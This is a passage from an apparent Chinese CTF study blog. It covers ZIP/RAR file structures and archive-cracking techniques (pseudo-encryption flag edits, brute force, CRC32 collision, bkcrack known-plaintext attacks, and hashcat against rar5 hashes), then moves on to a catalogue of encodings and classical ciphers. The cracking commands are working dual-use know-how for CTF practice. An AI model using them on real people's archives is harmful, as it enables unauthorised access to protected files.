核心目录(Central directory) ###\n\n`Central directory`包括`File header`和`Digital signature`\n\n文件头：\n\n|字段名称|长度(byte)|说明|\n|-----|-----|-----|\n|Central directory file header signature|4|中心目录文件头标识，固定值(50 4B 01 02)|\n|Version made by|2|压缩所用的ZIP版本|\n|Version needed to extract|2|解压文件所需的ZIP最低版本|\n|General purpose bit flag|2|通用位标记|\n|Compression method|2|压缩方法|\n|Last mod file time|2|文件最后修改时间|\n|Last mod file date|2|文件最后修改日期|\n|CRC-32|4|未压缩数据的CRC32|\n|Compressed size|4|压缩后的大小|\n|Uncompressed size|4|未压缩的大小|\n|File name length|2|文件名长度|\n|Extra field length|2|扩展区域长度|\n|File comment length|2|文件注释长度|\n|Disk number start|2|文件开始位置所在的磁盘编号|\n|Internal file attributes|2|内部文件属性|\n|External file attributes|4|外部文件属性|\n|Relative offset of local header|4|本地文件头的相对偏移|\n|File name|N|文件名|\n|Extra field|N|扩展区域|\n|File comment|N|文件注释|\n\n数字签名：\n此区域不是必须的\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|Header signature|4|头标识，固定值(50 4B 05 05)|\n|Size of data|2|数据的大小|\n|Signature data|N|签名数据|\n\n\n### 目录结束标识(End of central directory record) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|End of central directory signature|4|中心目录结束标识，固定值(50 4B 05 06)|\n|Number of this disk|2|当前磁盘编号|\n|Number of the disk with the start of the central directory|2|中心目录开头所在的磁盘号|\n|Total number of entries in the central directory on this disk|2|该磁盘上中心目录的条目总数|\n|Total number of entries in the central directory|2|中心目录的条目总数|\n|Size of the central directory|4|中心目录的大小|\n|Offset of start of central directory with respect to the starting disk number|4|中心目录开始位置相对于压缩文档开始位置的偏移|\n|.ZIP file comment length|2|.ZIP文件注释长度|\n|.ZIP file comment|N|.ZIP文件注释|\n\n\n## 常见考点 ##\n\n\n### 伪加密 ###\n\n伪加密可以说是非常常见，基础的考点了，正如名字中的`伪`，它本身并没有加密，但是通过修改`通用位标记`，可以使得解压软件认为这个文件存在加密\n\n例题：[BUU-zip伪加密](https://buuoj.cn/challenges#zip%E4%BC%AA%E5%8A%A0%E5%AF%86)\n\n可以看到是需要密码的\n\n![](/img/summary/misc/misc-compress-3.png)\n\n`010 editor`查看，修改`通用位标记`为`0x0000`\n\n![](/img/summary/misc/misc-compress-4.png)\n\n修改后可以直接解压了\n\n\n### 暴力破解 ###\n\n使用工具(archpr)或者脚本(python)对压缩包进行暴力破解密码\n\n基本可以分为`纯暴力`，`掩码`，`字典`\n\n纯暴力：一般是弱口令或者纯数字\n\n掩码：知道了密码的一部分，用掩码进行爆破。例如`??ert??`可以去匹配中间为`ert`的密码\n\n![](/img/summary/misc/misc-compress-5.png)\n\n\n字典：用题目中给出的或自己的弱口令字典去跑\n\n\n### CRC32碰撞 ###\n\n每个文件都有唯一的`CRC32`值，即使文件中有个一个`bit`发生了变化，`CRC32`值也会不同\n\n`CRC32`爆破就是知道文件中一段数据的长度和文件的`CRC32`值，通过脚本程序，利用穷举法，与其`CRC32`对照，从而达到猜解数据的目的（通常只适用于较小的文本文件，文件太大穷举难度太大）\n\n例题：[BUU-zip](https://buuoj.cn/challenges#zip)\n\n[github脚本1](https://github.com/kmyk/zip-crc-cracker)\n[github脚本2](https://github.com/theonlypwner/crc32)\n\n下载附件，解压得到`68`个压缩包，并且每个压缩文件里都有一个`4`个字节大小的名为`data.txt`的`txt`文件，于是尝试用`crc32`碰撞还原出所有压缩包中的文件内容\n\n![](/img/summary/misc/misc-compress-6.png)\n\n\n得到一串base64编码后的字符串，解压后修复压缩包得到flag\n\n\n### 明文攻击 ###\n\n明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。\n\n注意：明文对应文件的加密算法需要是`ZipCrypto Store`(linux下可以用unzip -v等命令查看)\n\n[ZIP 明文攻击原理](https://flandre-scarlet.moe/blog/1685/)\n\n例题：[BUU-[ACTF新生赛2020]明文攻击](https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB)\n\n![](/img/summary/misc/misc-compress-7.png)\n\n![](/img/summary/misc/misc-compress-8.png)\n\n\n### 深入明文攻击-bkcrack ###\n\n上个例子的明文攻击使用的是完整的文件，但是有时候没有文件，只知道加密文件的一部分字节数据(至少12个字节及偏移)，这时候如果满足加密算法(ZipCrypto Store)条件，就可以使用深入明文攻击\n\n例题：2022西湖论剑-take_the_zip_easy\n\n已知算法为`ZipCrypto Store`，且有一个zip文件，就可以得知文件头为`504B030414000000`\n\n![](/img/summary/misc/misc-compress-9.png)\n\n`echo -n \"dasflow.pcapng\" > plain.out`\n`./bkcrack -C zipeasy.zip -c dasflow.zip -p plain.out -o 30 -x 0 504B030414000000`\n\n参数解释：\n```text\n-C 加密压缩包\n-c 提取的密文部分\n-p 提取的明文部分\n-o offset  -p参数指定的明文在压缩包内目标文件的偏移量\n-x 压缩包内目标文件的偏移地址  部分已知明文值\n```\n\n`-o`为`30`是因为在zip格式中第三十位固定为压缩文件的名字\n\n![](/img/summary/misc/misc-compress-10.png)\n\n拿到key：`2b7d78f3 0ebcabad a069728c`，这个还不是真正的密码\n\n![](/img/summary/misc/misc-compress-11.png)\n\n\n通过`key`修改密码为`easy`，保存到`easy.zip`\n`./bkcrack -C zipeasy.zip -k 2b7d78f3 0ebcabad a069728c -U easy.zip easy`\n\n![](/img/summary/misc/misc-compress-12.png)\n\n\n### 双密码 ###\n\n>在启用 AES-256 模式生成受密码保护的 ZIP 存档时 ，如果密码太长，ZIP 格式会使用 PBKDF2 算法并对用户提供的密码进行 hash 处理。在这种情况下，这个新计算的 hash 将会成为文件的实际密码。太长是指超过 64 个字节（字符）。\n\n\n例子：\n\n`Nev1r-G0nna-G2ve-Y8u-Up-N5v1r-G1nna-Let-Y4u-D1wn-N8v4r-G5nna-D0sert-You`\n\n对应的 sha1 值\n\n`706b4838613041714e62486364773847726d5370`\n\n将每两位转成 ASCII 码，就产生了另一个明文密码\n\n`pkH8a0AqNbHcdw8GrmSp`\n\n\n# RAR文件 #\n\n## 文件结构分析 ##\n\nRAR不同于ZIP，RAR是一种专利文件格式\n2.0 版本前加密算法未公开，2.0 版本后使用AES算法加密\n\nRAR 5.0签名和RAR4.x的签名不一样：\n```test\nRAR 5.0 签名由8个字节组成:\n0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00\n\nRAR 4.x 签名由7字节组成:\n0x52 0x61 0x72 0x21 0x1A 0x07 0x00\n```\n\n**因为rar是商业格式，所以不同软件不同版本所压缩出来的可能会有细微差别，可以参考010中的rar模板**\n\n本文以RAR4.x为例子，可以大致分为四部分\n\n![](/img/summary/misc/misc-compress-13.png)\n\n\n\n### 标记块(MARK_HEAD) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|HEAD_CRC|2|总是0x6152|\n|HEAD_TYPE|1|0x72|\n|HEAD_FLAGS|2|总是0x1A21|\n|HEAD_SIZE|2|块大小 = 0x0007，即7个字节|\n\n所以这里标记块的大小固定是`7`个字节，且是一个固定的字节序列。标记块也称为Magic number。\n\n\n### 压缩文件头(MAIN_HEAD) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|HEAD_CRC|2|HEAD_TYPE到RESERVED2的CRC|\n|HEAD_TYPE|1|0x73|\n|HEAD_FLAGS|2|位标记|\n|HEAD_SIZE|2|压缩文件头总大小（包括压缩文件注释）|\n|RESERVED1|2|保留|\n|RESERVED2|4|保留|\n\n对于压缩文件头里的位标记，如果它的第9位(从左到右)被置1(则位标记应为0x0080)，块头被加密，也就是通常所说的加密文件名，打开这样加密的RAR文件时，需要先输入密码才能看到压缩包内的文件列表\n\n\n### 文件头(FILE_HEAD) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|HEAD_CRC|2|从HEAD_TYPE到FILE_NAME的CRC|\n|HEAD_TYPE|1|0x74|\n|HEAD_FLAGS|2|位标记|\n|HEAD_SIZE|2|文件头的全部大小(包含文件名和注释)|\n|PACK_SIZE|4|已压缩文件大小|\n|UNP_SIZE|4|未压缩文件大小|\n|HOST_OS|1|保存压缩文件使用的操作系统|\n|FILE_CRC|4|文件CRC|\n|FTIME|4|MS DOS标准格式的日期和时间|\n|UNP_VER|1|解压文件所需要最低RAR版本，版本编码方法：10 * 主版本 + 副版本。|\n|METHOD|1|压缩方式|\n|NAME_SIZE|2|文件名大小|\n|ATTR|4|文件属性|\n|HIGH_PACK_SIZE|4|可选值，已压缩文件大小64位值的高4字节。只HEAD_FLAGS中的0x100位被设置才存在。|\n|HIGH_UNP_SIZE|4|可选值，未压缩文件大小64位值的高4字节。只有HEAD_FLAGS中的0x100位被设置才存在。|\n|FILE_NAME|NAME_SIZE|文件名 - NAME_SIZE字节大小字符串|\n|SALT|8|可选值，如果(HEAD_FLAGS & 0x400)!= 0，则存在|\n|EXT_TIME|可变大小|可选值，扩展时间区域，如果(HEAD_FLAGS & 0x1000)!= 0，则存在\n\n在这个块中，存在两个CRC值，一个是文件头块中从块类型到文件名的校验，后一个则是压缩包中所含文件的CRC校验，解压时，会计算解压后生成文件的CRC值，如果等于这里的CRC，则解压完成，如果不同，则报错中断。\n\n### 结尾块(ENDARC_HEAD) ###\n\n|字段名称|长度(byte)|说明|\n|----|----|----|\n|HEAD_CRC|2|从HEAD_TYPE 到HEAD_SIZE 的CRC校验值|\n|HEAD_TYPE|1|0x7B|\n|HEAD_FLAGS|2|位标记|\n|HEAD_SIZE|2|结尾块大小|\n\n与标记块类似的是，结尾块也是一个固定字节串的块，依次是`C4 3D 7B 00 40 07 00`\n\n\n## 常见考点 ##\n\n### 暴力破解 ###\n\n比如：\n\nrar2john先提取hash\n`$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602`\n\nhashcat爆破密码\n`hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u`\n\n\n### 伪加密 ###\n\nrar在伪加密状态下会显示压缩包已损坏或压缩格式未知，所以很容易判断rar是否是伪加密\n\n修改`FILE_HEAD`中的`HEAD_FLAGS`即可\n\n![](/img/summary/misc/misc-compress-15.png)\n\n\n例题：[BUU-[VNCTF 2021]冰冰好像藏着秘密](https://buuoj.cn/match/matches/2/challenges#%E5%86%B0%E5%86%B0%E5%A5%BD%E5%83%8F%E8%97%8F%E7%9D%80%E7%A7%98%E5%AF%86)\n\n一打开就是一堆报错\n\n![](/img/summary/misc/misc-compress-14.png)\n\n修改第24字节为`80`即可正常打开\n\n\n\n# 其他 #\n\n## Zipbomb ##\n\n压缩包炸弹，利用压缩算法的特性，做到仅仅几kb和仅mb的压缩包文件，解压出来GB，甚至PB级的数据\n\npython脚本\n```python\nimport os.path\nimport zipfile\nimport re\n\ndir_path='C:\\\\Users\\\\19307\\\\Desktop\\\\11aa\\\\a'\nfiles= os.listdir(dir_path)\nnewfiles = files[::-1]\nprint(newfiles)\n\nfor file in newfiles:\n    position = dir_path+'\\\\'+ file\n    print (position)\n    z = zipfile.ZipFile(position, 'r')\n    for filename in z.namelist():\n        bytes = z.read(filename)\n        if b'Zmxh' in bytes or b'flag' in bytes:\n            print(filename)\n```\n\n例题：[BUU-DASCTF Sept X ZipBomb](https://buuoj.cn/match/matches/36/challenges#ZipBomb)\n\n\n\n\n\n参考\n[ZIP文件格式分析](https://sp4n9x.github.io/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/)\n[ZIP官方文档 - APPNOTE-6.3.6.TXT](https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.6.TXT)\n[RAR文件格式分析](https://sp4n9x.github.io/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/)\n[RAR-wiki](https://en.wikipedia.org/wiki/RAR_(file_format))","tags":["总结","misc","隐写"],"categories":["总结"]},{"title":"misc总结(编码密码篇)","url":"/posts/86a2c34b/","content":"\n>推荐使用[https://www.dcode.fr/](https://www.dcode.fr/)和CyberChef\n\n# 常见编码/加密\n\n## 1.1. ASCII编码\n\nASCII码大致可以分作三部分组成。\n\n第一部分是：ASCII非打印控制字符。ASCII表上的数字0–31分配给了控制字符，用于控制像打印机等一些外围设备。\n\n第二部分是：ASCII打印字符。数字 32–126 分配给了能在键盘上找到的字符，数字127代表 DELETE 命令。\n\n第三部分是：扩展ASCII打印字符。扩展的ASCII字符满足了对更多字符的需求。扩展的ASCII包含ASCII中已有的128个字符（数字0–32显示在下图中），又增加了128个字符，总共是256个。\n\n![](/img/summary/misc/ascii.png)\n\n![](/img/summary/misc/ascii-2.png)\n\n\n## 1.2. Base家族\n\nbase64 编码是用64（2^6）个字符，对二进制数据进行编码的方式\nbase32 就是用32（2^5）个字符，对二进制数据进行编码的方式\nbase16 就是用16（2^4）个字符，对二进制数据进行编码的方式\n\n这里我们可以清楚的看到，base系列编码之间的不同，在于用于编码的字符数量的多少\n具体参考[wiki百科](https://en.wikipedia.org/wiki/List_of_numeral_systems)\n\n\n### 1.2.1. base16码表\n\n`0123456789ABCDEF`\n\nBase16使用两个ASCII字符去编码原数据中的一个字节数据，所以Base16不可能用到填充符号`=`\n\n\n### 1.2.2. base32码表\n\n`ABCDEFGHIJKLMNOPQRSTUVWXYZ234567`\n\n另有`=`符号作为填充\n\n\n\n### 1.2.3. base58码表\n\n`123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz`\n\n相比 Base_64，Base_58 不使用数字 \"0\"，字母大写\"O\"，字母大写 \"I\"，和字母小写 \"l\"，以及 \"+\" 和 \"/\" 符号，比Base64共减少6个字符，故称着Base58\n\n\n### 1.2.4. base62码表\n\n`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789`\n\nBase62使用了62个字符编码，包括0-9，a-z，A-Z。\n\n\n### 1.2.5. base64码表\n\n`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/`\n\n另有`=`符号作为填充\n\n\n\n### 1.2.6. base91码表\n\n![](/img/summary/misc/base.png)\n\nBase91编码是从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建Base91编码表：-（破折号，0x2D）\\（反斜杠，0x5C）'（撇号，0x27）\n\n\n## 1.3. Quoted-printable 编码\n\nQuoted-printable或QP encoding，没有规范的中文译名，可译为可打印字符引用编码或使用可打印字符的编码。Quoted-printable是使用可打印的ASCII字符（如字母、数字与“=”）表示各种编码格式下的字符，以便能在7-bit数据通路上传输8-bit数据, 或者更一般地说在非8-bit clean媒体上正确处理数据。这被定义为MIME content transfer encoding，用于e-mail。\n\n例子：\n\n```Quoted-printable\n=E4=BB=8A=E5=B9=B4=E5=85=83=E5=A4=9C=E6=97=B6=EF=BC=8C=E6=9C=88=E4=B8=8E=E7=81=AF=E4=BE=9D=E6=97=A7=E3=80=82\n```\n\n特点：由`=`，大写字母`A–F`和数字`0-9`组成，不加密英文和数字\n\n解码：CyberChef可解\n\n## 1.4. XXencode编码\n\n表：`+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`\n\nXXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。\n\n例子：\n\n```XXencode\nhK3VZPaBjN4KxewfYmCjCl94yohH1jwXxiDPLpfrOneepdQuvjTXEo95UkiiV\nhcwXbiTjLvffnmeDDkfL2pwf-nwbNoxf6zPXqpxOxqeCggfitivL2gfyrrRD1\nhkSCmiQPfcODJsgXxiDPLpfrOiP9Ho16oiDN0OLGXfB9IBa7dRAuehOLCivTK\nhnecoiDPLuOCgkvysxhTdohH8ffrspgP+h95hmfv9yPDqnxOplAfxpfLKivjV\ndkiHIqX0pjHMnpeuwt84XohH9yPPIouPKhPL2nfjKkxTKhzioygnacOA+\n```\n\n特点：第一位通常表示这一行密文是由多少个字符加密得到的，比如`cat`加密后是`1Mq3o`，`1`在表中的索引值是3，所以可以看做原文由三位字符组成。并且每行最多只能加密`45`个字符，然后换行，可以参考上面的例子\n\n[在线加解密](http://web.chacuo.net/charsetxxencode)\n\n## 1.5. UUencode编码\n\n表：`ASCII字符集中可打印字符(32-96)`\n\nUUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。\n\n例子：\n\n```UUencode\nM555E;F-O9&7*Q]*[UM:V_KWXUL:UO<[$U]:UQ+'@PNNCK-?NU.?4VG5N:7@@\nMT\\J\\_L^US;/6T,JYT\\.CK,BKL\\:CNE5N:7@M=&\\M56YI>\"!E;F-O9&EN9Z.L\nM555E;F-O9&6]J\\KDR.O.Q+&^TM3#O\\C]N/;7UKW:SJJUI<Z[O?C0T+'@PNNC\nMK,CGN?O7[KKSRJ//PK7$U\\K!S\\G9T]K(_;CVU]:]VJ.LLKNYN[7$LK^WW=/#\nMP>.RN<;KH:/(_;CVU]:]VKFRT]`R-+CV0FETHZS2U#8M8FETSJJUI<Z[M];.\nMJC2X]M?IHZS#O[CVU^G2U,JNO?C6QL\"TL>W*OLOYL_;/UK7$U]:]VK7$ROW6\nMM:&CU>*X]LK]UK76N[OAPN34VC\"UO38SUJZ\\Y*&CR+NZ\\[VKP[^X]LK]O-/)\nMSS,RHZS+^;+ZR?JUQ+WAN?NXU;K#PN34VD%30TE)U]:W^[ROUM\"_R;3RTZ'7\nCUK?[HZ@S,BV_U;#7H:TY-2VUU\\_?HZFUQ+>VSJ?6KM;0H:,`\n```\n\n\n特点：与XXencode相似，第一位表示这一行密文是由多少个字符加密得到的。\n\n[在线加解密](http://web.chacuo.net/charsetuuencode)\n\n\n## 1.6. 敲击码\n\n基于5×5方格波利比奥斯方阵来实现\n\n![](/img/summary/misc/tap%20code.png)\n\n\n例子：\n\n```tap code\n..... ../... ./... ./... ../\n52 31 31 32\n```\n\n原文：`wllm`\n\n特点：不超过五个点，两个一组，使用斜杠分隔每组\n\n\n## 1.7. 莫尔斯电码\n\n摩尔斯电码主要由以下5种它的代码组成：\n1：点（.）\n2：划（-）\n3：每个字符间短的停顿（通常用空格表示停顿）\n4：每个词之间中等的停顿（通常用 / 划分）\n5：以及句子之间长的停顿\n\n\n表\n\n```\nA  .-    N  -.    .  .-.-.-  +  .-.-.    1  .----\nB  -...  O  ---   ,  --..--  _  ..--.-   2  ..---\nC  -.-.  P  .--.  :  ---...  $  ...-..-  3  ...--\nD  -..   Q  --.-  \"  .-..-.  &  .-...    4  ....-\nE  .     R  .-.   '  .----.  /  -..-.    5  .....\nF  ..-.  S  ...   !  -.-.--              6  -....\nG  --.   T  -     ?  ..--..              7  --...\nH  ....  U  ..-   @  .--.-.              8  ---..\nI  ..    V  ...-  -  -....-              9  ----.\nJ  .---  W  .--   ;  -.-.-.              0  -----\nK  -.-   X  -..-  (  -.--.\nL  .-..  Y  -.--  )  -.--.-\nM  --    Z  --..  =  -...-\n```\n\n例子：`.../---/...`\n\n原文：`SOS`\n\n解码：CyberChef可解\n\n\n## 1.8. 社会主义核心价值观编码\n\ngithub上的加解密js代码\n\n```javascript\nimport \"babel-polyfill\";\n{\n    function assert(...express){\n        const l = express.length;\n        const msg = (typeof express[l-1] === 'string')? express[l-1]: 'Assert Error';\n        for(let b of express){\n            if(!b){\n                throw new Error(msg);\n            }\n        }\n    }\n\n    function randBin(){\n        return Math.random() >= 0.5;\n    }\n\n    const values = '富强民主文明和谐自由平等公正法治爱国敬业诚信友善';\n\n    function str2utf8(str){\n        // return in hex\n\n        const notEncoded = /[A-Za-z0-9\\-\\_\\.\\!\\~\\*\\'\\(\\)]/g;\n        const str1 = str.replace(notEncoded, c=>c.codePointAt(0).toString(16));\n        let str2 = encodeURIComponent(str1);\n        const concated = str2.replace(/%/g, '').toUpperCase();\n        return concated;\n    }\n\n    function utf82str(utfs){\n        assert(typeof utfs === 'string', 'utfs Error');\n\n        const l = utfs.length;\n\n        assert((l & 1) === 0);\n\n        const splited = [];\n\n        for(let i = 0; i < l; i++){\n            if((i & 1) === 0){\n                splited.push('%');\n            }\n            splited.push(utfs[i]);\n        }\n\n        return decodeURIComponent(splited.join(''));\n    }\n\n    function hex2duo(hexs){\n        // duodecimal in array of number\n\n        // '0'.. '9' -> 0.. 9\n        // 'A'.. 'F' -> 10, c - 10    a2fFlag = 10\n        //          or 11, c - 6      a2fFlag = 11\n        assert(typeof hexs === 'string')\n\n        const duo = [];\n\n        for(let c of hexs){\n            const n = Number.parseInt(c, 16);\n            if(n < 10){\n                duo.push(n);\n            }else{\n                if(randBin()){\n                    duo.push(10);\n                    duo.push(n - 10);\n                }else{\n                    duo.push(11);\n                    duo.push(n - 6);\n                }\n            }\n        }\n        return duo;\n    }\n\n    function duo2hex(duo){\n        assert(duo instanceof Array);\n\n        const hex = [];\n\n        const l = duo.length;\n\n        let i = 0;\n\n        while(i < l){\n            if(duo[i] < 10){\n                hex.push(duo[i]);\n            }else{\n                if(duo[i] === 10){\n                    i++;\n                    hex.push(duo[i] + 10);\n                }else{\n                    i++;\n                    hex.push(duo[i] + 6);\n                }\n            }\n            i++;\n        }\n        return hex.map(v=>v.toString(16).toUpperCase()).join('');\n    }\n\n\n    function duo2values(duo){\n        return duo.map(d=>values[2*d]+values[2*d+1]).join('');\n    }\n\n    function valuesDecode(encoded){\n        const duo = [];\n\n        for(let c of encoded){\n            const i = values.indexOf(c);\n            if(i === -1){\n                continue;\n            }else if(i & 1){\n                continue;\n            }else{\n                // i is even\n                duo.push(i >> 1);\n            }\n        }\n\n        const hexs = duo2hex(duo);\n\n        assert((hexs.length & 1) === 0);\n\n        let str;\n        try{\n            str = utf82str(hexs);\n        }catch(e){\n            throw e;\n        }\n        return str;\n    }\n\n\n    function valuesEncode(str){\n        return duo2values(hex2duo(str2utf8(str)));\n    }\n\n    // ------------------\n\n    const decodedArea = document.getElementById('decoded-area');\n    const encodedArea = document.getElementById('encoded-area');\n    const decodeBtn = document.getElementById('decode-btn');\n    const encodeBtn = document.getElementById('encode-btn');\n\n    encodeBtn.addEventListener('click', e=>{\n        encodedArea.value = '';\n        const encoded = valuesEncode(decodedArea.value);\n        encodedArea.value = encoded;\n    });\n\n    decodeBtn.addEventListener('click', e=>{\n        decodedArea.value = '';\n        const decoded = valuesDecode(encodedArea.value);\n        decodedArea.value = decoded;\n    });\n};\n```\n\n分析后不难发现有以下几点结论：\n\n1：表是`富强 民主 文明 和谐 自由 平等 公正 法治 爱国 敬业 诚信 友善`，索引值`0-11`\n\n2：字符串hex值中的0-9 对应 表索引值的0-9。比如十六进制的0，在表中是`富强`\n\n\n3：字符串hex值中的A-F 对应 表索引值的关系有两种\n\n```\nA -> 10 0\nB -> 10 1\nC -> 10 2\nD -> 10 3\nE -> 10 4\nF -> 10 5\n\nA -> 11 4\nB -> 11 5\nC -> 11 6\nD -> 11 7\nE -> 11 8\nF -> 11 9\n```\n\n\n\n解释一下上面的结论，以`我Kc !6`为例子\n加密后的几种结果为\n`诚信自由公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正`\n`诚信自由公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正`\n`友善爱国公正爱国爱国敬业民主自由诚信民主公正和谐文明富强文明民主和谐公正`\n`友善爱国公正爱国爱国敬业民主自由友善平等公正和谐文明富强文明民主和谐公正`\n\n先将`我Kc !6`以十六进制编码的形式表示`E6 88 91 4B 63 20 21 36`\n\n`E`在表中是`10 4`或者`11 8`，然后拿`10 4`和`11 8`在索引表中找到`诚信 自由`或者`友善 爱国`，再接着是`6`，在表中是`公正`，后面的以此类推。\n\n## 1.9. jjencode/aaencode\n\njjencode代码，就是将正常的js代码转换成复杂的只有符号的字符串编码，进行加密 如：`[$._$_]+$._$+\",\\\\\"+$.$__+$.___+\"\\\\\"+$.__$+$.__$+$`这样的组合\n\n[jjencode加密/解密](https://utf-8.jp/public/jjencode.html)\n\naaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。如:` ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) `这样的表情文字\n\n\n[AAEncode加密/解密](http://www.hiencode.com/aaencode.html)\n\n\n\n## 1.10. 埃特巴什码(Atbash)\n\n就是倒着来\n\n常文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z\n密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A\n\n例子\n\n```Atbash\nWZHXGU{5v0u98z95u79829y7z484z54066xy08u}\nDASCTF{5e0f98a95f79829b7a484a54066cb08f}\n```\n\nCyberChef可解\n\n\n## 1.11. 金笛短信PDU编码\n\n需要一行一行地解码\n\n例子\n\n```text\n0001000D91683106019196F4000872003800390035003000340045003400370030004400300041003100410030004100300030003000300030003000300044003400390034003800340034003500320030003000300030003000300034003700300030003000300030003000300038003000380030003200300030003000300030\n0001000D91683106019196F4000872003000320034004400430037003500460031003000300030003000300030004200430034003900340034003400310035003400370038003500450044004400390032003400310031003200380035003300300030003800340033004200390031003900460037003300460031003500390046\n0001000D91683106019196F400087000380034004600410038003700310032003100370036004500370034003500310032003600450033004400340041003600320044003700390035003500420033003800380032003100310037003900390042004200320045004100420039003500410036004200330042004200450037\n0001000D91683106019196F400086E0042003600300039003900330045004500360033004600320036004600440044003100420043004400410042003300300033003300310046004500350045003600440039003300370035004200300036003500360036004100320031003000410033004100420037003100440038\n0001000D91683106019196F400087000450033004400370032003100300031004400420034003900310036003900360038003000310033003200340046003800450046003200380034004500420033003500430030004600420036003400450046003100300030004100310042004100300043003200300044004400450042\n0001000D91683106019196F400086E0038003400410032004200440038004200350038004200330039004500410043003600450030004100420031003000380044003600440036004600340034004300460044003800310044003000330042003600390034004200430039003400430032003300310033004400340046\n0001000D91683106019196F400087000360038003900390031003600440036003200360041003700390035003800460035004300440039003500390042004500320038004300340034003300410045003700360043003100300035003800380030003200380035003900320039003600310042004600430044003400300044\n0001000D91683106019196F4000872003100350037004600310033003400310033003800390043004600410042003600410045003500460032003300300038003700370035004500380031004500420032003000330030004300300035003000340037003500310044003900460041003400450045004600320032004600440030\n0001000D91683106019196F400085200300037004400450044003500420036003800410033003100350046004400310031003000300030003000300030003000300034003900340035003400450034003400410045003400320036003000380032\n```\n\n[金笛短信PDU编码解码工具](http://www.sendsms.cn/pdu/)\n\n\n## 1.12. Twitter Secret Messages\n\n例子：\n\n```text\ni hａd a grｅａｔ dａｙ at the beach! #sunshine                \n```\n\n特点：密文中有很多Unicode字符\n\n\n[在线网站解密](https://holloway.nz/steg/)\n\n\n## 1.13. 中文电码\n\n中文电码表采用了四位阿拉伯数字作代号，从0001到9999按四位数顺序排列，用四位数字表示最多一万个汉字、字母和符号。汉字先按部首，后按笔划排列。字母和符号放到电码表的最尾。\n\n例子：\n\n```中文电码\n中：0022\n文：2429\n电：7193\n码：4316\n```\n\n特点：四个数字一组\n\n[在线查询中文电码](http://code.mcdvisa.com/)\n\n\n\n## 1.14. 凯撒密码\n\n凯撒密码是一种替换加密技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。\n\n\n[凯撒(Caesar)加密/解密](https://ctf.bugku.com/tool/caesar)\n\n\n## 1.15. VBS加密\n\nenc.vbe内容如下\n\n```vbs\n#@~^HAAAAA==W^lLyPb/P@#@&4*.2{W!!x[mFC&|0AcAAA==^#~@\n```\n\n[VBScript encrypter and decrypter](https://master.ayra.ch/vbs/vbs.aspx)\n\n\n## 1.16. 盲文\n\n>布莱尔创造的由6个点为基础结构的盲字，在纸面上有的凸起，有的不凸起，形成64种变化，即64种符形，在每个符号（单位称\"方”）左右两列，每列各三个点，从左边自上而下叫做1、2、3点，从右边自上而下叫做4、5、6点。\n\n\n英语字母盲文表如下\n\n![](/img/summary/misc/mangwen-1.png)\n\n\n数字盲文表如下\n\n![](/img/summary/misc/mangwen-2.png)\n\n\n[在线翻译](https://unicode-table.com/cn/tools/braille/)\n\n\n\n## 1.17. ook\n\nOok! 与Brainfuck类似, 但用单词\"Ook\"，\"Ook.\" 和 \"Ook?\"代替。\n\n[在线网站1](https://www.splitbrain.org/_static/ook/)\n[在线网站2](https://ctf.bugku.com/tool/brainfuck)\n\n\n## 1.18. 